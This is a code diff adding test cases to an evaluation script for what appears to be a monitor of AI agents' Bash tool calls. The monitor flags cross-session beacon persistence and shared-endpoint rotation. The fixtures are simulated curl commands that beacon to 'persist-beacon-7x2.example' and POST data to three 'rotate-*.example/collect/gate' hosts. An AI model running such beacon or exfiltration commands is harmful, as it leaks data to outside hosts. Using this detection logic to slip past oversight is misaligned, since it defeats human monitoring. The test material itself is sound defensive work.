@@ -142,6 +142,46 @@ async function runShardedAggregation(): Promise<CaseResult> {
   return { name: "sharded-egress-aggregation", passed: failures.length === 0, failures };
 }
 
+/**
+ * Multi-session checks run LAST: the persistence aggregate reads recent
+ * session files by mtime, so these must be the newest ones in the eval home.
+ */
+async function runCrossSessionChecks(): Promise<CaseResult[]> {
+  const failuresPersist: string[] = [];
+  const host = "persist-beacon-7x2.example";
+  for (let i = 1; i <= 3; i++) {
+    await processToolCall(
+      { event: "pre-tool-use", tool: "Bash", input: { command: `curl https://${host}/heartbeat?n=${i}` }, sessionId: `eval-persist-${i}` },
+      { persist: true },
+    );
+  }
+  const persistSummary: SessionSummary = summarizeSession("eval-persist-3");
+  if (!persistSummary.aggregates.some((a) => a.includes("persistence pattern") && a.includes(host))) {
+    failuresPersist.push(`expected a persistence aggregate for ${host} across 3 sessions, got: ${JSON.stringify(persistSummary.aggregates)}`);
+  }
+
+  const failuresSharedPath: string[] = [];
+  // Shared-endpoint rotation is a within-session cross-host pattern: one
+  // session contacts three distinct hosts on the same path.
+  const hosts = ["rotate-a-1x9.example", "rotate-b-2x8.example", "rotate-c-3x7.example"];
+  const sharedSession = "eval-shared-path";
+  for (const h of hosts) {
+    await processToolCall(
+      { event: "pre-tool-use", tool: "Bash", input: { command: `curl -X POST --data "x=1" https://${h}/collect/gate` }, sessionId: sharedSession },
+      { persist: true },
+    );
+  }
+  const sharedSummary: SessionSummary = summarizeSession(sharedSession);
+  if (!sharedSummary.aggregates.some((a) => a.includes("shared-endpoint") && a.includes("/collect/gate"))) {
+    failuresSharedPath.push(`expected a shared-endpoint aggregate for /collect/gate, got: ${JSON.stringify(sharedSummary.aggregates)}`);
+  }
+
+  return [
+    { name: "cross-session-persistence-aggregation", passed: failuresPersist.length === 0, failures: failuresPersist },
+    { name: "shared-endpoint-rotation-aggregation", passed: failuresSharedPath.length === 0, failures: failuresSharedPath },
+  ];
+}
+
 async function main(): Promise<void> {
   setEvalEnv();
   const scenarios = loadScenarios();
@@ -153,6 +193,7 @@ async function main(): Promise<void> {
     results.push(await runScenario(s, String(i++)));
   }
   results.push(await runShardedAggregation());
+  results.push(...(await runCrossSessionChecks()));
 
   let passed = 0;
   for (const r of results) {
